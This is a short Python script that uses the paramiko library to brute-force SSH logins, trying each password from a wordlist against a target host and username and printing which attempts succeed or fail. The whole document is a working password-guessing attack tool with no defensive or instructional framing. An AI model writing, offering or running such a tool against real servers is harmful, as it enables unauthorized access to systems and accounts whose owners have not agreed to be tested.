import paramiko

def brute_force_ssh(target, username, password_list):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for password in open(password_list):
        password = password.strip()
        try:
            ssh.connect(target, username=username, password=password, timeout=3)
            print(f"[SUCCESS] {username}:{password}")
            ssh.close()
            break
        except:
            print(f"[FAIL] {username}:{password}")
